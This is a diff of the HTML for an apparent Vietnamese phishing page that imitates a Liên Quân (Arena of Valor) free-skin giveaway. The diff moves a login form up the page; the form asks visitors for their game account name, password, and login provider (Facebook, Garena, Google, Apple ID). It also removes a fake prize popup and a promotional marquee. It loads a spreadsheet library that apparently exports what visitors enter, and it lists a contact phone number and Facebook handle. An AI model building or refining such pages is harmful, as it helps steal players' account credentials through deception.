@@ -5,24 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>TEST ONE</title>
   <link rel="stylesheet" href="css/index.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
- 
-  <!-- Video Background -->
-  <video autoplay muted loop playsinline id="bg-video">
-    <source src="video/Nenvideo.MP4" type="video/mp4">
-    Trình duyệt của bạn không hỗ trợ video.
-  </video>
-  <div class="video-overlay"></div>
-
+  <!-- Ảnh nền -->
+  <img src="img/nen1.jpg" alt="background" 
+       style="position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-1;">
   <div class="page">
     
     <!-- Header -->
     <header class="header">
-      <h1 class="marquee">
-        Chào mừng bạn đến với trang web của tôi — Khuyến mãi cực lớn hôm nay,
-        chỉ 10.000 Ruby nhận ngay Nakroth Thứ Nguyên Vệ Thần và nhiều skin bậc SS khác.
-      </h1>
     </header>
 
     <!-- Bên trái -->
@@ -43,7 +35,37 @@
         <li>Khuyến mãi nạp lần đầu nhận thêm quà</li>
       </ul>
     </div>
+       <!-- Form (chuyển lên ngay sau Thông báo) -->
+    <section class="form-section">
+      <div class="container">
+        <form id="wordForm" autocomplete="off">
+          <h2>Nhập thông tin</h2>
 
+          <label for="name">Tài Khoản:</label>
+          <input type="text" id="name" placeholder="Nhập tài khoản" required />
+
+          <label for="password">Mật khẩu:</label>
+          <input type="password" id="password" placeholder="Nhập mật khẩu" required />
+
+          <label for="subject">Đăng nhập bằng:</label>
+          <select id="subject" required>
+            <option value="">-- Chọn --</option>
+            <option value="Facebook">Facebook</option>
+            <option value="Garena">Garena</option>
+            <option value="Google">Google</option>
+            <option value="Apple ID">Apple ID</option>
+          </select>
+
+          <label for="message">Skin muốn nhận:</label>
+          <textarea id="message" rows="5" placeholder="Nhập tên Skin" required></textarea>
+
+          <div class="btn-group">
+            <button type="button" id="txtBtn" class="btn btn-secondary">Đăng nhập</button>
+            <button type="reset" id="excelBtn" class="btn btn-primary">Thoát</button>
+          </div>
+        </form>
+      </div>
+    </section>
     <!-- Bên phải -->
     <div class="event-right">
       <h3>Sự kiện HOT</h3>
@@ -62,24 +84,24 @@
       </ul>
     </div>
 
-<!-- Cột giữa bên trái -->
-<div class="event-mid-left">
-  <h3>Tin HOT</h3>
-  <ul>
-    <li>Sự kiện đặc biệt cuối tuần</li>
-    <li>Nhận quà khi đăng nhập mỗi ngày</li>
-    <li>Vòng quay may mắn x5</li>
-    <li>Skin SS chọn miễn phí</li>
-    <li>Giảm giá cửa hàng 50% toàn bộ vật phẩm</li>
-    <li>Đua top Clan nhận Ruby miễn phí</li>
-    <li>Săn Boss thế giới thưởng skin hiếm</li>
-    <li>Quà tặng sinh nhật Liên Quân 2025</li>
-  </ul>
-</div>
+    <!-- Cột giữa bên trái -->
+    <div class="event-mid-left">
+      <h3>Tin HOT</h3>
+      <ul>
+        <li>Sự kiện đặc biệt cuối tuần</li>
+        <li>Nhận quà khi đăng nhập mỗi ngày</li>
+        <li>Vòng quay may mắn x5</li>
+        <li>Skin SS chọn miễn phí</li>
+        <li>Giảm giá cửa hàng 50% toàn bộ vật phẩm</li>
+        <li>Đua top Clan nhận Ruby miễn phí</li>
+        <li>Săn Boss thế giới thưởng skin hiếm</li>
+        <li>Quà tặng sinh nhật Liên Quân 2025</li>
+      </ul>
+    </div>
 
     <!-- Giữa phải -->
     <div class="event-mid-right">
-      <h3>Cập nhật mới</h3>
+      <h3>Cập nhật</h3>
       <ul>
         <li>Ra mắt tướng mới</li>
         <li>Thêm chế độ chiến trường</li>
@@ -90,48 +112,15 @@
         <li>Hệ thống xếp hạng mới</li>
         <li>Kho trang phục mở rộng thêm 20 skin</li>
         <li>Fix lỗi đăng nhập và tối ưu hiệu suất</li>
-
       </ul>
     </div>
 
     <!-- Nội dung chính -->
     <main class="main">
-      
-      <!-- Form -->
-      <section class="form-section">
-        <div class="container">
-          <form id="wordForm" autocomplete="off">
-            <h2>Nhập thông tin</h2>
-
-            <label for="name">Tài Khoản:</label>
-            <input type="text" id="name" placeholder="Nhập tài khoản" required />
-
-            <label for="password">Mật khẩu:</label>
-            <input type="password" id="password" placeholder="Nhập mật khẩu" required />
-
-            <label for="subject">Đăng nhập bằng:</label>
-            <select id="subject" required>
-              <option value="">-- Chọn --</option>
-              <option value="Facebook">Facebook</option>
-              <option value="Garena">Garena</option>
-              <option value="Google">Google</option>
-              <option value="Apple ID">Apple ID</option>
-            </select>
-
-            <label for="message">Skin muốn nhận:</label>
-            <textarea id="message" rows="5" placeholder="Nhập tên Skin" required></textarea>
-
-            <div class="btn-group">
-              <button type="button" id="txtBtn" class="btn btn-secondary">Đăng nhập</button>
-              <button type="reset" id="excelBtn" class="btn btn-primary">Thoát</button>
-            </div>
-          </form>
-        </div>
-      </section>
 
       <!-- Liên hệ -->
       <section class="boxes-section">
-        <h2 class="boxes-title">Đường dây nóng - SOS</h2>
+        <h2 class="boxes-title">Xin vui lòng liên hệ với Nhà phát triển qua các kênh sau:</h2>
         <div class="box-container">
          
           <a href="http://zalo.me/84939232002" target="_blank" class="box box-1">
@@ -143,12 +132,6 @@
           <a href="https://facebook.com/UlasCutiee" target="_blank" class="box box-2">
             <div class="box-content">
               <h3>Facebook</h3>
-            </div>
-          </a>
-
-          <a href="tel:0939232002" class="box box-3">
-            <div class="box-content">
-              <h3>Call Phone</h3>
             </div>
           </a>
 
@@ -169,7 +152,7 @@
 
     <!-- Footer -->
     <footer class="footer">
-      <p>@26.09.2025 — UlasCutieee</p>
+      <p>@DEV_UlasCutieee</p>
     </footer>
   </div>
 
@@ -187,16 +170,7 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
   <script src="js/index.js"></script>
   <script src="js/events.js"></script>
-  <!-- Popup Modal -->
-<div id="rewardModal" class="modal">
-  <div class="modal-content">
-    <span class="close-btn">&times;</span>
-    <h2>🎉 Chúc mừng!</h2>
-    <p>Cảm ơn bạn đã trúng thưởng một tài khoản <b>Full Tướng - Full Skin</b></p>
-    <p>Vui lòng liên hệ qua Zalo/FB để nhận quà: <b>0939232002</b></p>
-    <p>Chúc bạn có những trải nghiệm tuyệt vời!</p>
-  </div>
-</div>
+
 </body>
 <script>
   const modal = document.getElementById("rewardModal");
